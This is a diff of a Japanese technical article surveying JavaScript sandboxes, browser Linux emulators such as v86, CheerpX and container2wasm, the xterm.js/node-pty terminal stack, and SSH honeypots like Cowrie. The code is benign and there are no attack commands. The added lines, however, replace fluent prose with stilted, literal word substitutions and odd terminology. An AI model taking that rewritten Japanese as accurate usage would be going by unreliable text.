-結論：セキュリティを気にするなら、本当の選択肢は正確に2つ----`isolated-vm`（ネイティブアドオン、V8 Isolate、フルJS速度）と`quickjs-emscripten`（Wasm、ブラウザ互換、計算負荷の高いコードで~10倍遅い）だ。それ以外は「やめてください」（`vm`、`vm2`）か、まったく別の問題を解決するランタイム（Deno）だ。ShadowRealmがいつかこの状況を変えるかもしれないが、まだそこには届いていない。
+判定：安全が大事なら、本物選択肢は正確に2つだ。`isolated-vm`（ネイティブ拡張、V8 Isolate、全速JS）と`quickjs-emscripten`（Wasm、ブラウザ対応、計算集約で約10倍遅い）だ。残り全部は「やめてくれ」(`vm`、`vm2`)か違う問題を解くランタイム（Deno）だ。ShadowRealmはいつか流れを変えるかも。でもまだじゃない。
 
 ---
 
-## パート2 -- JavaScriptのLinuxエミュレーター
+## パート2。JavaScriptのLinuxエミュレータ
 
-ここからが本当に面白いところだ。これらは*本物の*エミュレーターで----JavaScriptまたはWebAssemblyでCPU命令セットを実装し、実際のLinuxカーネルイメージを起動し、本物のユーザーランドバイナリを実行する。分離は、ゲストとホストが何も共有しないことから来る：異なるメモリ空間、異なる命令ストリーム。
+ここから私には本当に面白くなる。ここは*本物*エミュレータだ。JavaScriptかWebAssemblyで命令集合を実装して、本物Linuxカーネル image を起動して、本物ユーザー空間バイナリを実行する。隔離は客とホストが何も共有しないことから来る。違うメモリ空間、違う命令流だ。
 
-代償は莫大だが、得られるものは本当に注目に値する：実際のLinuxが、実際にブラウザやNodeプロセスの中で動作している。考えてみると結構ヤバくない？
+代償は巨大だ。でも得るものは本当に驚異的だ。本物Linuxが、本当に回る。ブラウザやNodeプロセス内でね。考えるとかなりすごいよね。
 
-### 2.1 `v86` -- JS + Wasm JITのx86 PCエミュレーター
+### 2.1 `v86`。JSとJIT Wasmのx86 PCエミュレータ
 
-GitHubのFabrice（copy）による`v86`は、JavaScriptで最も高性能なオープンソースx86エミュレーターだ。2013年頃にピュアJSインタプリタとして始まり、x86ベーシックブロックをオンザフライでWebAssemblyにトランスパイルするJITコンパイルシステムに進化し、パフォーマンスを劇的に向上させている。
+`v86`はFabrice（GitHubのcopy）作でJavaScript最強のオープンソースx86エミュレータだ。2013年頃純JS解釈器として始まって、x86基本ブロックを実行時にWebAssemblyへ翻訳するJIT制へ進化して、性能がかなり上がった。
 
-エミュレートするもの：
-- **CPU**: x86-32（IA-32）、命令セットはおおよそPentium 1レベル。64ビット（x86-64）は未対応----これはハードなアーキテクチャ制限であり、機能の欠落ではない。
-- **FPU**: JavaScriptの`Float64Array`経由。x87は80ビット拡張精度だが、JSのdoubleは64ビット。つまり浮動小数点の結果が実際のCPUと微妙に異なる可能性がある。
-- **メモリ**: 設定可能。JSヒープ内の`SharedArrayBuffer`または`ArrayBuffer`にマップされる。
-- **ハードウェア**: 8254 PIT（タイマー）、8259 PIC（割り込みコントローラー）、8042キーボードコントローラー（PS/2）、CMOS RTC、SVGA拡張とBochs VBE付きVGA、IDEコントローラー、フロッピーコントローラー（8272A）、NE2000ネットワークカード。
-- **BIOS**: SeaBIOS（オープンソースx86 BIOS）を使用。
+エミュレートするのはこうだ。
+- **CPU**：x86-32（IA-32）、だいたいPentium 1水準の命令集合。64ビット（x86-64）は除外のまま。これは機能欠落じゃなくハード建築限界だ。
+- **FPU**：JavaScript `Float64Array`経由だ。x87は80ビット拡張精度。JS double は64ビットだ。つまり浮動小数点結果は本物CPUと微妙に違うことがある。
+- **メモリ**：設定可能で、JSヒープ内`SharedArrayBuffer`か`ArrayBuffer`に対応付ける。
+- **ハード**：8254 PIT（タイマー）、8259 PIC（割り込み管理）、8042キーボード管理（PS/2）、CMOS RTC、SVGAとBochs VBE拡張付きVGA、IDE管理、フロッピー管理（8272A）、NE2000網カードだ。
+- **BIOS**：SeaBIOS（オープンソースx86 BIOS）を使う。
 
-JITはベーシックブロック（ジャンプのないx86命令のシーケンス）を識別し、WebAssembly関数に変換し、その関数をキャッシュし、同じブロックの後続の実行で呼び出す。ホットなコードパスはネイティブWasmのパフォーマンスを得る。コールドパスはJSインタプリタにフォールバックする。
+JITは基本ブロック（跳びなしx86命令並び）特定して、WebAssembly関数へ翻訳して、キャッシュして、同じブロック次実行時に呼ぶ。熱いコード道はネイティブWasm性能になる。冷たい道はJS解釈器に戻る。
 
 ```js
 import { V86 } from "v86";
@@ -302,187 +302,171 @@ const emulator = new V86({
   bios:    { buffer: readFileSync("./bios/seabios.bin") },
   vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
   hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
-  memory_size: 128 * 1024 * 1024, // 128 MB
+  memory_size: 128 * 1024 * 1024, // 128MB
   autostart: true,
 });
 
-// シリアル出力（Linuxカーネルコンソール）をキャプチャ
+// カーネル串行出力を取る（Linuxカーネル出力）
 emulator.add_listener("serial0-output-byte", byte => {
   process.stdout.write(String.fromCharCode(byte));
 });
 
-// ゲストに入力を送信（シェルにタイプ）
+// 客へ入力を送る（シェルに入力）
 emulator.serial0_send("ls /\n");
 ```
 
-**対応OS**: Alpine Linux（秀逸）、Ubuntu 16.04/18.04（i386のみ）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（制限あり）、MS-DOS。
+**対応OS**：Alpine Linux（優秀）、Ubuntu 16.04/18.04（i386のみ）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（留保付き）、MS-DOSだ。
 
-**起動時間**: クリーンイメージからのAlpine Linuxで15–40秒。これは本物のカーネル初期化に内在する----スキップできない。そう、ユーザーはブラウザでカーネル起動シーケンスを眺めることになる。それが取引だ xD
+**起動時間**：クリーン image からAlpine Linuxで15-40秒だ。本物カーネル初期化に固有だ。飛ばせない。そう、ユーザーはブラウザでLinuxカーネル起動を見る。取引だ。
 
-**メモリ下限**: インスタンスあたり100–256 MB。Wasm JITコードキャッシュだけでも、ビジーなLinuxインスタンスで数十MBに達する。
+**最小メモリ**：インスタンスあたり100-256MBだ。Wasm JITコードキャッシュだけで占有Linuxインスタンス数十MBになりうる。
 
-**Node.jsでの使用**: 完全対応。DOM不要----シリアルだけ気にするならVGA出力は破棄できる。
+**Node.js利用**：完全対応だ。DOMは不要のまま。VGA出力は串行出力だけ要るなら無視できる。
 
-**できないこと**: 64ビットバイナリの実行、最新カーネル機能（eBPF、io_uringなど）の使用、メモリ制限に引っかからずに同時に数個以上のインスタンスを実行すること。
+**できないこと**：64ビットバイナリ実行、現代カーネル機能利用（eBPF、io_uringなど）、数インスタンス超の同時実行（メモリ上限に当たる）。
 
-**npm**: [v86](https://www.npmjs.com/package/v86) -- 継続的に更新、執筆時点で最終公開は昨日。  
-**GitHub**: [copy/v86](https://github.com/copy/v86)  
-**デモ**: [copy.sh/v86](https://copy.sh/v86)
-
----
-
-### 2.2 JSLinuxとTinyEMU -- Bellardの作品、2度
-
-JSLinuxはFabrice Bellard自身のJavaScript Linuxエミュレーター----最初のもので、2011年に公開された。この記事で何度もBellardの名前が出てくるのは、彼が次から次へと登場するからだ：QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。この男は別格だ。ソフトウェア史上、最も印象的な個人の技術的貢献の一つと言っても過言ではない。
-
-オリジナルのJSLinuxは純粋なJSのx86インタプリタだった。2016年、BellardはTinyEMU（C言語のRISC-Vエミュレーター）を書き、Emscripten経由でJavaScriptにコンパイルし、それが現在のJSLinuxのベースになった。つまり現在のJSLinuxは、実際にはJavaScriptを生成するCコードであって、手書きのJSではない。
-
-Bellardのサイトの技術ノートは読む価値がある：現在のJSLinuxは32または64ビットのRISC-V CPU（x86ではない）を実行し、VirtIOコンソール、VirtIOネットワーク、VirtIOブロックデバイス、ホストとのファイル共有用9Pファイルシステムをエミュレートする。JSデモはEmscriptenを使ってCからコンパイルされている----手書きのJSではない。
-
-TinyEMU自体が対応するもの：
-- RISC-V RV32IMAFDQC および RV64IMAFDQC（32および64ビット、浮動小数点、乗算、圧縮命令）
-- KVM経由のx86（ネイティブのみ、エミュレーションなし----つまりJSバージョンはRISC-Vのみ）
-- VirtIOコンソール、ネットワーク、ブロック、入力、9Pファイルシステム
-
-TinyEMUにはEmscripten経由のJavaScriptデモが用意されている。JSLinuxのベースであり、`container2wasm`（セクション2.5参照）でも使われている。
-
-**JSLinuxのステータス**: npmパッケージなし、プログラム可能なAPIなし。ブラウザで開くデモだ。歴史的意義は高い----概念を証明した。ライブラリとしての実用的な使用：なし。
-
-**TinyEMU**: npmにはなし、Cソースは[bellard.org/tinyemu](https://bellard.org/tinyemu/)で入手可能。
+**npm**：[v86](https://www.npmjs.com/package/v86)。継続更新で、私が書く同日に最新公開。  
+**GitHub**：[copy/v86](https://github.com/copy/v86)  
+**デモ**：[copy.sh/v86](https://copy.sh/v86)
 
 ---
 
-### 2.3 jor1k -- OR1Kエミュレーター
+### 2.2 JSLinuxとTinyEMU。Bellardの仕事、2回分
 
-jor1kはSebastian MackeによるJavaScriptで書かれたOpenRISC 1000（OR1K）エミュレーターだ。歴史的に興味深いのは、jor1kがVirtIO 9Pファイルシステムサポートを導入し、Bellardが後にTinyEMUとJSLinuxに取り入れたからだ。これらのプロジェクト間のクロス・ポリネーションは緊密で、互いに借用し合っている----これがオープンソースエミュレーション作品の最もクールな点の一つだ。
+JSLinuxはFabrice Bellard自作のJavaScript Linuxエミュレータだ。最初で2011年公開だ。この記事でBellardに言及し続けるのは現れ続けるからだ。QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。この人は別物だ。誇張なくソフトウェア史上いちばん印象的な個人技術貢献の1つだ。
 
-**ステータス**: もう積極的にはメンテナンスされていない。npmパッケージなし。現時点ではアーカイブされている。主に歴史的文脈のために知っておく価値がある----誰かが会話でjor1kを持ち出したら、何のことかわかるってわけだ :)
+元JSLinuxは純x86 JS解釈器だった。2016年、BellardはTinyEMU（C書きRISC-Vエミュレータ）を書いて、Emscripten経由でJavaScriptへコンパイルした。今JSLinuxの土台になった。だから今JSLinuxは実際、手書きJSじゃないCが生成するJavaScriptだ。
+
+Bellardサイトの技術 note は読む価値ある。今JSLinuxは32か64ビットRISC-V CPU（x86じゃない）を回して、VirtIOコンソール、VirtIO網、VirtIOブロック装置、ホストとファイル共有用9Pファイルシステムをエミュレートする。JSデモはEmscripten使ってCからコンパイルされる。手書きJSじゃない。
+
+TinyEMU自体はこう対応する。
+- RISC-V RV32IMAFDQCとRV64IMAFDQC（32と64ビット、浮動小数点、乗算、圧縮命令）
+- KVM経由x86（ネイティブのみ、エミュなし。だからJS版はRISC-Vのみ）
+- VirtIOコンソール、網、ブロック、入力、9Pファイルシステム
+
+TinyEMUはEmscripten経由のJavaScriptデモ付きだ。JSLinuxの土台で、`container2wasm`も使う（2.5節参照）。
+
+**JSLinux状態**：npmパッケージなし、プログラム可能APIなし。ブラウザで開くデモだ。歴史重要性は大きい。概念を証明した。ライブラリとしての実用性：ゼロだ。
+
+**TinyEMU**：npmになし、Cソースは[bellard.org/tinyemu](https://bellard.org/tinyemu/)にある。
 
 ---
 
-### 2.4 CheerpX -- ブラウザ向け商用x86エミュレーター
+### 2.3 jor1k。OR1Kエミュレータ
 
-Leaning TechnologiesによるCheerpXは、商用のプロダクショングレードx86 Linuxエミュレーターだ。オープンソースではないが、実際のDebian/Ubuntuユーザーランドを動かすには`v86`より大幅に高性能だ。ブラウザで実際のVSCodeが必要なら、これを使う。
+jor1kはSebastian Macke書きのJavaScript製OpenRISC 1000（OR1K）エミュレータだ。歴史的に面白い。jor1kがVirtIO 9Pファイルシステム対応を導入して、BellardがTinyEMUとJSLinuxに取り込んだからだ。このプロジェクト間の受粉は密だ。互いに発想を借り合う。オープンソースエミュ仕事のいちばん素敵なところの1つだ正直。
 
-`v86`との主な違い：
-- より広いISAに対応（より多くのx86拡張、より良いglibc互換性）
-- ブラウザ内のIndexedDBベースのファイルシステム（ページリロード間で永続）
-- `SharedArrayBuffer`によるpthreadサポート（COOP/COEPヘッダーが必要----そう、あの面倒なセキュリティヘッダー）
-- VSCode、Python、Node.jsなどの実際のアプリケーションを実行するよう設計----最小限のOSイメージだけではない
-- プロフェッショナルサポートとSLAあり（つまり壊れたら誰かを怒鳴れる）
+**状態**：もう活性保守なし、npmパッケージなし。現時点で保存だ。歴史文脈用に知る価値あるだけだ。会話でjor1kが出たら、今は分かるってことだ :)
 
-典型的なユースケースは「サーバーなしでブラウザで実際のLinuxアプリケーションを実行する」。企業はブラウザベースのIDE、コーディングチュートリアル、インタラクティブなドキュメンテーションに使っている。
+---
+
+### 2.4 CheerpX。ブラウザ用商用x86エミュレータ
+
+Leaning Technologies製CheerpXは製品級の商用Linux x86エミュレータだ。オープンソースじゃない。でも本物DebianやUbuntuユーザー空間を回すにはv86よりかなり有能だ。ブラウザで本物VSCodeが要るならこれだ。
+
+v86との主要違い：
+- 広いISA対応（広いx86拡張、良いglibc互換）
+- ブラウザ内IndexedDB基準のファイルシステム（ページ再読み込み間で永続）
+- `SharedArrayBuffer`経由のpthread対応（COOPやCOEPヘッダー要。うん面倒な安全ヘッダー）
+- 本物VSCode、Python、Node.js、他実アプリを回す設計。最小OS image じゃない
+- 専門対応とSLAあり（壊れたら怒れる相手がいる）
+
+典型用途は「サーバーなしでブラウザに本物Linuxアプリを回す」ことだ。企業はブラウザ基準IDE、コーディング教程、対話文書に使う。
 
 ```js
-// CheerpX API（簡略化）
+// CheerpX API（簡略）
 const cx = await CheerpX.Linux.create({
   mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
 });
 await cx.run("/bin/bash");
 ```
 
-**Node.jsの対応**: CheerpXはブラウザファースト。基礎となるエミュレーターは理論的にはNodeでも動くかもしれない（Wasmなので）が、APIとドキュメントは完全にブラウザ使用に向いている。サーバーサイドでの使用はサポートされていない。
+**Node.js話**：CheerpXはまずブラウザ向け設計だ。土台エミュレータは理論上Nodeで動く（Wasmだ）。でもAPIも文書も完全ブラウザ利用志向だ。サーバー側利用は非対応だ。
 
-**メモリ**: `v86`と同様----実際のDebianインスタンスで200+ MB。  
-**価格**: オープンソースプロジェクトには無料、プロダクションSaaSには商用ライセンス。  
-**ドキュメント**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)
-
----
-
-### 2.5 WebContainers（StackBlitz） -- Wasm内のNode.js、Linuxエミュレーションではない
-
-WebContainersはよくLinuxエミュレーターと一緒くたにされるが、アーキテクチャは異なる。x86をエミュレートしない。Linuxを起動しない。WASIを使ってWebAssemblyにコンパイルされたNode.jsを実行する。この区別は重要で、俺自身もこれにずっと混乱してた lol。
-
-混乱はマーケティングから来ていると思う----「ブラウザでNode.jsを実行する」と聞くとエミュレーションのように聞こえるが、実際はVM内でNode.jsを動かすLinuxエミュレーションではなく、Node.js自身がWasmにコンパイルされている。まったく別物だ。
-
-アーキテクチャ：
-1. Node.jsがWasmにコンパイルされる（具体的にはカスタムWASIランタイム）
-2. Service WorkerがエミュレートされたNode.jsサーバーからのネットワークリクエストをインターセプトし、ブラウザタブにルーティングする
-3. ファイルシステムはブラウザメモリ内に存在する（ディスクI/Oなし）
-4. npmはブラウザ内使用に最適化されたカスタム実装
-
-```js
-import { WebContainer } from "@webcontainer/api";
-
-const webcontainer = await WebContainer.boot();
-
-// ファイルを書き込む
-await webcontainer.mount({
-  "index.js": { file: { contents: `console.log("hello")` } },
-  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
-});
-
-// Node.jsコマンドを実行
-const proc = await webcontainer.spawn("node", ["index.js"]);
-proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
-```
-
-実際のNode.js（Wasmコンパイル済み）を実行するので、実際のnpm、実際のNode.js API、実際のモジュール解決が得られる。汎用Linuxユーザーランドは得られない----システムパッケージを`apt`でインストールしたり、任意のコンパイル済みバイナリを実行したり、Node.jsエコシステムの外で多くのことはできない。
-
-**ブラウザ要件**: SharedArrayBuffer（COOP/COEPヘッダーが必要）、Service Worker対応、モダンWasm。
-
-**Node.jsの対応**: ブラウザ専用に設計。ブラウザコンテキスト外ではAPIは機能しない。
-
-**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
-**ドキュメント**: [webcontainers.io](https://webcontainers.io)
+**メモリ**：v86同様。本物Debianインスタンス200MB超。  
+**価格**：オープンソースプロジェクト無料、本番SaaS商用ライセンス。  
+**文書**：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)
 
 ---
 
-### 2.6 container2wasm -- WasmにコンパイルされたDockerコンテナ
+### 2.5 WebContainers（StackBlitz）。WasmのNode.jsで、Linuxエミュじゃない
 
-`container2wasm`はNTTのツール（npmパッケージではない）で、DockerコンテナイメージをWebAssemblyバイナリに変換し、任意のWasmホスト（ブラウザを含む）で実行できるようにする。最初に見たときは本当に信じられなかった。
+WebContainersはLinuxエミュレータと同じ袋に入れられがちだが建築が違う。x86エミュしない。Linux起動しない。WASI使ってWebAssemblyコンパイルのNode.jsを回す。この区別は大事だ。混乱して無駄に時間使った。
 
-メカニズム：
-- x86_64コンテナの場合：Bochs（Wasmにコンパイルされたx86エミュレーター）+ コンテナのルートファイルシステムを埋め込む
-- riscv64コンテナの場合：TinyEMU（またBellardだ！）+ コンテナのルートファイルシステムを埋め込む
-- 結果の`.wasm`ファイルがエミュレーターを起動し、コンテナファイルシステムをマウントし、コンテナのエントリーポイントを実行する
+混乱は売り文句から来ると思う。「ブラウザでNode.jsを回す」はエミュっぽく聞こえる。でも実際、WASI内で動く特定カスタムランタイムをコンパイルしたNode.js自体で、VM内エミュLinuxでNode.jsを回すんじゃない。まったく違う2建築だ。
+
+建築：
+1. Node.jsはWasmコンパイルされる（特定カスタムWASIランタイム）
+2. Service WorkerがエミュNode.jsサーバーの網リクエストを横取りしてブラウザタブへ振る
+3. ファイルシステムはブラウザメモリ内（ディスクI/Oなし）
+4. npmはブラウザ利用最適の自作実装だ
+
+本物Node.js（Wasmコンパイル）を回すから、本物npm、本物Node.js API、本物モジュール解決が出る。汎用Linuxユーザー空間は出ない。`apt`で system パッケージ入れられないし、任意コンパイルバイナリ実行できないし、Node.js生態系外では大したことできない。
+
+**ブラウザ前提**：SharedArrayBuffer（COOPやCOEPヘッダー要）、Service Worker対応、現代Wasmだ。
+
+**Node.js話**：ブラウザ利用専用設計だ。APIはブラウザ文脈外で動かない。
+
+**npm**：[@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
+**文書**：[webcontainers.io](https://webcontainers.io)
+
+---
+
+### 2.6 container2wasm。WasmコンパイルのDockerコンテナ
+
+`container2wasm`は道具だ（npmパッケージじゃない）。NTT製でDockerコンテナ image をWebAssemblyバイナリへ変換する。任意Wasmホスト（ブラウザ込み）で回る。初めて見たとき本当に動くとは信じなかった。
+
+仕組み：
+- x86_64コンテナ用：Bochs（Wasmコンパイルのx86エミュレータ）とコンテナ root ファイルシステムを埋め込む
+- riscv64コンテナ用：TinyEMU（またBellard！）とコンテナ root ファイルシステムを埋め込む
+- 結果`.wasm`ファイルはエミュレータ起動して、コンテナファイルシステムを載せて、コンテナ入口点を実行する
 
 ```bash
-# Ubuntu 22.04コンテナをWasmに変換
+# Ubuntu 22.04コンテナをWasmへ変換
 c2w ubuntu:22.04 out.wasm
 
 # 実行
 wasmtime out.wasm uname -a
 # Linux 5.15.0 #1 SMP riscv64 GNU/Linux
 
-# ブラウザ用に提供
+# ブラウザ利用に出す
 c2w --to-js ubuntu:22.04 /tmp/htdocs/
 ```
 
-結果の`.wasm`は大きい----最小限のUbuntuでも数百MB----しかし完全に自己完結している。誰かに`.wasm`をメールで送って、ブラウザでUbuntuを実行してもらうことができる。その文は意味をなさないはずだが、現実だ。
+結果`.wasm`は巨大だ。最小Ubuntuで数百MBだ。でも完全自立だ。`.wasm`をメールで誰かに送ればブラウザでUbuntu回せる。この文は意味不明なはずなのに現状こうだ。
 
-**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)
+**GitHub**：[container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)
 
 ---
 
-### エミュレーターファミリーまとめ
+### エミュレータ系統まとめ
 
 | | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
 |---|---|---|---|---|---|---|
-| **アーキテクチャ** | x86-32 JIT→Wasm | RISC-V（Wasm） | OR1K（JS） | x86（プロプライエタリ） | Node.js→Wasm/WASI | x86/RISC-V（Wasm） |
-| **本物のカーネル** | ✅ | ✅ | ✅ | ✅ | ❌（Node.js） | ✅ |
-| **64ビット** | ❌ | ✅（RISC-V） | ❌ | ✅ | n/a | ✅ |
-| **npmパッケージ** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌（CLIツール） |
-| **Node.js使用** | ✅ | ❌ | ❌ | ❌ | ❌（ブラウザのみ） | Wasmtime経由 |
-| **ブラウザ使用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **RAM/インスタンス** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
-| **起動時間** | 15–40秒 | 10–30秒 | 10–30秒 | 15–40秒 | 2–5秒 | 10–40秒 |
+| **建築** | x86-32 JITからWasm | RISC-V (Wasm) | OR1K (JS) | x86（非公開） | Node.jsからWasm/WASI | x86/RISC-V (Wasm) |
+| **本物カーネル** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
+| **64ビット** | ❌ | ✅ (RISC-V) | ❌ | ✅ | 該当なし | ✅ |
+| **npmパッケージ** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI道具) |
+| **Node.js利用** | ✅ | ❌ | ❌ | ❌ | ❌（ブラウザのみ） | Wasmtime経由 |
+| **ブラウザ利用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| **RAM/インスタンス** | 150-256MB | 約64-128MB | 約64MB | 200MB超 | 約100MB | 約200-500MB |
+| **起動時間** | 15-40秒 | 10-30秒 | 10-30秒 | 15-40秒 | 2-5秒 | 10-40秒 |
 | **オープンソース** | ✅ | ✅ | ✅ | ❌ | 部分的 | ✅ |
-| **ステータス** | ✅ 非常に活発 | ✅ 安定 | ⚠️ アーカイブ | ✅ 商用 | ✅ 活発 | ✅ 活発 |
+| **状態** | ✅ とても活性 | ✅ 安定 | ⚠️ 保存 | ✅ 商用 | ✅ 活性 | ✅ 活性 |
 
-この表から浮かび上がるのは：`v86`はnpmパッケージであり、ブラウザとNodeの両方で動作し、オープンソースである唯一のものだ。だから「JavaScript Linuxエミュレーター」の会話で支配的なんだ。他のものには何かしらの欠点がある----JSLinuxにはAPIがない、jor1kはアーカイブ、CheerpXは有料、WebContainersはブラウザ専用でNode固有、container2wasmはビルドステップとCLIが必要。「JavaScriptでLinuxを起動する」だけが必要なら、ほとんどいつも`v86`が適切な出発点だ。
+この表で目立つこと：`v86`はnpmパッケージで、ブラウザとNode両方で回って、オープンソースな唯一だ。だから「JavaScript Linuxエミュレータ」会話を支配する。残り全部に欠点がある。JSLinuxはAPIなし、jor1kは保存、CheerpXは金がかかる、WebContainersはブラウザのみNode専用、container2wasmは build 段階とCLIが要る。「JavaScriptでLinux起動する」だけなら、`v86`はほぼつねに正しい出発点だ。
 
 ---
 
-## パート3 -- ターミナルスタック：xterm.jsとnode-pty
+## パート3。端末 stack：xterm.jsとnode-pty
 
-シェル的な体験を作るときに常に出てくる2つのパッケージ。サンドボックスでもエミュレーターでもない----UIとPTYの配管だ----でも非常に近接しているので、省くのは心が痛む。それに両方使ったことがあるけど、本当にいい出来だ。
+シェル風体験を作るとき常に出る2パッケージだ。サンドボックスでもエミュレータでもない。UIとPTY配管だ。でも関連深いから外すのは気が引けた。あと両方使ったことあって本当に良い。
 
-### 3.1 `xterm.js` -- ターミナルレンダラー
+### 3.1 `xterm.js`。端末レンダー
 
-xterm.jsはブラウザ用のターミナルエミュレーターだ。`<canvas>`要素でターミナル画面（VT100/xtermエスケープシーケンス）をレンダリングし、キーボード入力を処理し、データの入出力用APIを公開する。
+xterm.jsはブラウザ用端末エミュレータだ。`<canvas>`要素に端末画面（VT100やxterm逃避並び）を表示して、キー入力扱って、データを回すAPIを出す。
 
-使用先：VS Codeの統合ターミナル、Azure Cloud Shell、Proxmox VE、AWS CloudShellなど。
+使うのはこうだ。VS Code内蔵端末、Azure Cloud Shell、Proxmox VE、AWS CloudShell、その他いろいろだ。
 
 ```js
 import { Terminal } from "@xterm/xterm";
@@ -494,28 +478,28 @@ term.loadAddon(fitAddon);
 term.open(document.getElementById("terminal"));
 fitAddon.fit();
 
-// ターミナルにデータを送信（テキストとしてレンダリング）
+// 端末へデータ送信（テキスト表示）
 term.write("$ ");
 term.onData(data => {
-  // dataはキーストローク----バックエンドに送信
+  // dataは打鍵。backendへ送る
   socket.send(data);
 });
 socket.onmessage(msg => {
-  // バックエンドからの出力----表示
+  // backend出力。表示する
   term.write(msg.data);
 });
 ```
 
-xterm.jsはレンダリングレイヤーのみ。シェルを実行しない。コマンドを解釈しない。好きなバックエンドに配線する表示ウィジェットだ。多くの人がxterm.jsが「ターミナルをやる」と思っているが、実際はただの画面----コマンドを実際に実行する何かに接続する必要がある。
+xterm.jsはレンダー層だけだ。シェル実行しない。命令解釈しない。選ぶ backend へ繋ぐ表示 widget だ。xterm.jsが「端末をやる」と思う人は多い。でも本当は画面だけだ。実際に命令を実行する何かに繋がなきゃいけない。
 
-**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
-**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)
+**npm**：[@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
+**GitHub**：[xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)
 
 ---
 
-### 3.2 `node-pty` -- PTY生成
+### 3.2 `node-pty`。PTY作成
 
-`node-pty`はNode.jsで擬似端末（PTY）を生成し、それに対する読み書きハンドルを提供する。xterm.jsと組み合わせて、サーバー上で実行されている実際のシェル（bash、zsh、fish）と通信するブラウザターミナルを構築できる。
+`node-pty`はNode.jsで擬似端末（PTY）を作って読み書き handle を渡す。xterm.jsと使えば、サーバーで回る本物シェル（bash、zsh、fish）と話すブラウザ端末を作れる。
 
 ```js
 import * as pty from "node-pty";
@@ -529,44 +513,44 @@ const shell = pty.spawn("bash", [], {
 });
 
 shell.onData(data => {
-  // WebSocket経由でブラウザのxterm.jsに送信
+  // WebSocket経由でブラウザxterm.jsへ送る
   ws.send(data);
 });
 
 ws.on("message", data => {
-  // ブラウザのキーストロークをシェルに転送
+  // ブラウザ打鍵をシェルへ伝える
   shell.write(data);
 });
 ```
 
-これがクラウドIDEやWebターミナルの標準パターンだ：xterm.js（ブラウザ）↔ WebSocket ↔ node-pty ↔ 本物のbash。分離はない。シェルはNode.jsプロセス（またはそれを実行するユーザー）の全権限で動作する。
+クラウドIDEとウェブ端末の標準図式だ。xterm.js（ブラウザ）とWebSocketとnode-ptyと本物bashだ。隔離は存在しない。シェルはNode.jsプロセス（や起動ユーザー）の全権限で実行する。
 
-**メンテナンス**: Microsoft。  
-**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
-**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)
+**保守**：Microsoft。  
+**npm**：[node-pty](https://www.npmjs.com/package/node-pty)  
+**GitHub**：[microsoft/node-pty](https://github.com/microsoft/node-pty)
 
 ---
 
-## パート4 -- SSHハニーポット
+## パート4。SSHハニーポット
 
-ハニーポットは攻撃されるために設計されている。目標は、攻撃者が対話するのに十分リアルに見えつつ、脅威インテリジェンスのためにすべての行動を記録することだ。SSHは主要なターゲットだ。なぜならインターネット上で最も攻撃されるサービスだから----パブリックIPでポート22を公開すると、文字通り数分以内に自動スキャン試行が見える。試してみてほしい、どれだけ速いかちょっと怖くなるから。
+ハニーポットは攻撃されるために設計される。目標は攻撃者がやり取りするくらい本物に見せて、脅威情報用に全部記録することだ。SSHは主標的だ。ネットでいちばん攻撃されるサービスだからだ。公開IPで22番を開けたら文字通り数分で自動走査試行が見える。いつか試して。来る速さがかなり怖いくらいだ。
 
-ハニーポットの品質は2つのもので測定される：**忠実度**（どれだけ説得力を持って本物のシステムを装うか）と**テレメトリー**（どれだけ有用なデータをキャプチャするか）。これらはトレードオフの関係にある。高忠実度のハニーポットは構築が難しく、運用リスクも高い。
+ハニーポット品質は2つで測る。**忠実度**（本物 system をどれだけ説得力真似るか）と**測定**（どれだけ有用データ取るか）だ。両者は緊張する。高忠実ハニーポットは作り難く運用も危ない。
 
-このセクションが、最終的に`typescript-virtual-container`に`HoneyPot`モジュールを構築するきっかけになったので、ここにはいくつか意見がある。
+この節が結局`typescript-virtual-container`に`HoneyPot`モジュール作るに至らせた。だからいくつか意見がある。
 
-### 4.1 Cowrie -- 黄金基準
+### 4.1 Cowrie。黄金律
 
-CowrieはPythonベースの中〜高インタラクションのSSHおよびTelnetハニーポットだ。研究・セキュリティコミュニティで最も広くデプロイされているSSHハニーポットだ。
+CowrieはPython製の中高対話SSHとTelnetハニーポットだ。研究と安全コミュニティでいちばん配備されるSSHハニーポットだ。
 
-アーキテクチャ：
-- **プロトコル層**: 本物のSSHプロトコル実装（Twisted Conch）。攻撃者は本物のハンドシェイク、本物の鍵交換、本物の認証を得る。
-- **シェル層**: 偽のファイルシステム（Debian 5.0を模倣）と、一般的なコマンドに応答する部分的なシェルインタプリタ。
-- **プロキシモード**: 背後にある実際のシステムに転送（高インタラクションモード）、通過するすべてを記録。
-- **LLMモード**（最近追加）: 言語モデルを使って、処理方法を知らないコマンドに動的な応答を生成。そう、CowrieにはAIモードがある。すごい時代だ。
+建築：
+- **protocol 層**：本物SSH protocol 実装（Twisted Conch）。攻撃者は本物の握手、本物鍵交換、本物認証を得る
